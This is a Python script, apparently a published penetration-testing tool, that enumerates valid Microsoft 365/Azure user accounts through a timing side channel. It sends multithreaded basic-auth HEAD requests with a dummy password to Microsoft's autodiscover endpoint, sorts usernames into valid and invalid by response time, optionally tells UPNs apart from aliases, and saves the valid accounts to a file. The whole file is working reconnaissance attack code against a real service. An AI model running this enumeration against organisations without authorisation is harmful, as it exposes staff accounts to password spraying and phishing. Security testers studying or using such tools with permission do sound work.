#!/usr/bin/env python3
#
# azure basic auth time-based enumeration in autodiscover server
# variation on foofus.net CAS Authentication Timing attack identified in 2014 - http://h.foofus.net/?p=784
#
# 2024 @nyxgeek - TrustedSec
#

import argparse
import requests
import random
import string
import time
import urllib3
from statistics import mean
import concurrent.futures

# these are the default values - they will be adjusted if threads are higher than 20
max_timeout = 0.81
max_upn_time = 0.45
experimental = False

# Suppress warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def generate_random_usernames(count=1, domain="intranet.directory"):
    usernames = []
    for _ in range(count):
        length = random.randint(5, 10)
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
        usernames.append(f"{username}@{domain}")
    return usernames

def check_response_time(upn):
    url = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc"
    auth = (upn, 'notarealpassword12345')
    start_time = time.time()
    max_request_timeout = max_timeout + 2
    try:
        response = requests.head(url, auth=auth, verify=False, timeout=max_request_timeout)
        response_code = response.status_code
    except requests.exceptions.Timeout:
        # Suppress the timeout error or handle it silently
        timeout_value = 3
        response_code = "XXX"
        return timeout_value, response_code
    except Exception as e:
        # Handle other exceptions, if needed
        print(f"Error for {upn}: {e}")
        timeout_value = 3
        response_code = "ERR"
        return timeout_value, response_code
    end_time = time.time()
    response_time = end_time - start_time
    return response_time, response_code

def process_upns(upns, threads, verbose=False, quiet=False):
    response_times = []
    invalid_response_times = []
    valid_response_times = []
    upn_response_times = []
    alias_response_times = []
    valid_usernames = []

    if verbose:
        print("upn,response_time")

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_upn = {executor.submit(check_response_time, upn): upn for upn in upns}
        for future in concurrent.futures.as_completed(future_to_upn):
            upn = future_to_upn[future]
            response_time, response_code = future.result()
            if response_time is not None:
                if response_code is None:
                    response_code = "???"
                response_times.append(response_time)
                if response_time >= max_timeout:
                    invalid_response_times.append(response_time)
                    if not quiet:
                        print(f"INVALID: {upn} {response_code} {response_time:.2f}")
                elif response_time < max_timeout:
                    valid_response_times.append(response_time)
                    valid_usernames.append(upn)

                    if experimental:
                        # EXPERIMENTAL - now determine if UPN or Alias
                        if response_time < max_upn_time:
                            upn_response_times.append(response_time)
                            if verbose:
                                print(f"VALID UPN: {upn} {response_code} {response_time:.2f}")
                            else:
                                print(f"VALID UPN: {upn}")
                        else:
                            alias_response_times.append(response_time)
                            if verbose:
                                print(f"VALID ALIAS: {upn} {response_time:.2f}")
                            else:
                                print(f"VALID ALIAS: {upn}")
                    else:  # not experimental
                        if not quiet:
                            print(f"VALID: {upn} {response_code} {response_time:.2f}")
                        else:
                            print(f"VALID: {upn}")
            else:
                print(f"ERROR: No response time for {upn}")

    return response_times, invalid_response_times, valid_response_times, upn_response_times, alias_response_times, valid_usernames

if __name__ == "__main__":
    kickass2 = '''

                   .,,uod8BRBBB8bou,,.
          ..,uod8BBBBBBBBBBBBBBBBBBRPFT?l!i:.
     ,=m8BBBBBBBBBBBBBBBBRPFT?!||||||||||||||                     U T O D I S C O V E      E N U M E R A T O R
    !...:!TVBBBRPFT||||||||||!!^^""'     ||||                   A U T O D I S C O V E R    E N U M E R A T O R
    !.......:!?|||||!!^^""'              ||||                   A U T O D I S C O V E R    E N U M E R A T O R
    !.........||||                       ||||                   A U T O         O V E R    E N U M
    !.........||||  #                    ||||                   A U T O         O V E R    E N U M
    !.........||||                       ||||                   A U T O D I S C O V E R    E N U M E R A T O R
    !.........||||                       ||||                   A U T O D I S C O V E R    E N U M E R A T O R
    !.........||||                       ||||                   A U T O         O V E R    E N U M
    !.........||||                       ||||                   A U T O         O V E R    E N U M
    `.........||||                      ,||||                   A U T O         O V E R    E N U M E R A T O R
     .;.......||||                _.-.-!!||||                   A U T O         O V E R    E N U M E R A T O R
    .,uob.....||||        _.-!!||||||||||!:'                    A U T O         O V E R    E N U M E R A T O R
    !YBBBBBb..!|||:..-!!!|||||||||!iof68BBBBRPFb.
    !..YBBBBBb!!||||||||||!iof68BBBBBBBBBRPFT?!:::
    !....YBBBBBbaaitf68BBBBBBBBBBBBRPFT?!:::::::::                            AutoDiscover Enumerator
    !......YBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^"`;::                                  for Azure
    !........YBBBBBBBBRPFT?!::::::::::^''...:::::;
    `..........YBFT?!::::::::::::::::::::::::;iof68bo.
      `..........:::::::::::::::::::::;iof688888888888b.                    @nyxgeek - TrustedSec 2024
        `........::::::::::::::;iof688888888888888888888b.
          `......:::::::;iof688888888888888888888888888888b.     https://github.com/nyxgeek/autodiscover_enum
            `....:;iof688888888888888888888888888888888899fT!
              `..!8888888888888888888888888888888899fT|!^"'
                `'!.88888888888888888888888899fT|!^"'                     [ Time-Based User Enumeration ]
                   `!!8888888888888888899fT|!^"'
                      `!988888888899fT|!^"'
                        `!9899fT|!^"'
                          `!^""
    '''

    # this ascii art terminal was modified from one found here: https://www.asciiart.eu/computers/computers



    # Set up argument parser
    parser = argparse.ArgumentParser(description="Check response times for HTTPS HEAD requests.")
    parser.add_argument('-u', '--user', type=str, help="Specify a single UPN")
    parser.add_argument('-U', '--userfile', type=str, help='Specify a file containing a list of UPNs or usernames. Multiple UPN domains are allowed in one file.\nIf usernames, must specify -d (domain)')
    parser.add_argument('-q', '--quiet', action='store_true', help="only show valid users, no timing info")
    parser.add_argument('-v', '--verbose', action='store_true', help="Verbose output")
    parser.add_argument('-N', '--nobanner', action='store_true', help="Suppress banner display")
    parser.add_argument('-T', '--threads', type=int, default=1, help="Number of threads to use (default is 1)")
    parser.add_argument('-t', '--tenant', type=str, help="tenant as an onmicrosoft.com domain. only required for guest enumeration - ex: contoso.onmicrosoft.com")
    parser.add_argument('-d', '--domain', type=str, help="domain. only required if your userfile does not contain full UPNs")
    parser.add_argument('-m', '--max-timeout', type=float, default=0.81, help="Number of seconds to consider invalid (default is 0.81)")
    parser.add_argument('-E', '--experimental', action='store_true', help="Enable Experimental Identification of UPN vs Alias. Recommend 1 thread.")
    parser.add_argument('-o', '--output', type=str, help="Output filename for valid UPNs. Will append to existing if the file already exists")

    args = parser.parse_args()

    upns_to_check = []

    if not args.nobanner:
        print(f"\n{kickass2}\n")

    if args.experimental:
        experimental = True

    if args.max_timeout:
        max_timeout = args.max_timeout

    start_enum_time = time.time()
    if args.verbose:
        print(f"Starting time: {start_enum_time}")

    if args.user:
        if "@" in args.user:
            upns_to_check.append(args.user)
        else:
            print(f"Invalid UPN format: {args.user}")
    elif args.userfile:
        with open(args.userfile, 'r') as f:
            upns_to_check = [line.strip() for line in f.readlines() if "@" in line]

    if args.threads > 25:
        if args.verbose:
            print("Threads are greater than 25. Setting max_timeout to 0.70")
        max_timeout = 0.70
    if args.threads > 50:
        if args.verbose:
            print("Threads are greater than 50. Setting max_timeout to 0.65")
        max_timeout = 0.65

    if upns_to_check:
        response_times, invalid_response_times, valid_response_times, upn_response_times, alias_response_times, valid_usernames = process_upns(upns_to_check, args.threads, args.verbose, args.quiet)

        if args.output and valid_usernames:
            with open(args.output, 'a') as output_file:
                for username in valid_usernames:
                    output_file.write(f"{username}\n")
            print(f"Valid usernames written to '{args.output}'.")

        if response_times and args.verbose:
            print(f"\n-----------------------------\n")
            print(f"Average response time: {mean(response_times):.2f} seconds")
            print(f"    Avg  INVALID time: {mean(invalid_response_times):.2f} seconds")
            print(f"    Avg   VALID  time: {mean(valid_response_times):.2f} seconds")
            if upn_response_times and experimental:
                print(f"    - Avg VALID   UPN: {mean(upn_response_times):.2f} seconds")
            if alias_response_times and experimental:
                print(f"    - Avg VALID Alias: {mean(alias_response_times):.2f} seconds")
            print(f"Highest response time: {max(response_times):.2f} seconds")
            print(f"Lowest response time: {min(response_times):.2f} seconds")
            end_enum_time = time.time()
            elapsed_time = end_enum_time - start_enum_time
            print(f"\nEnd time: {end_enum_time}")
            print(f"Elapsed time: {elapsed_time}")

    else:
        print("No UPNs provided for checking.")

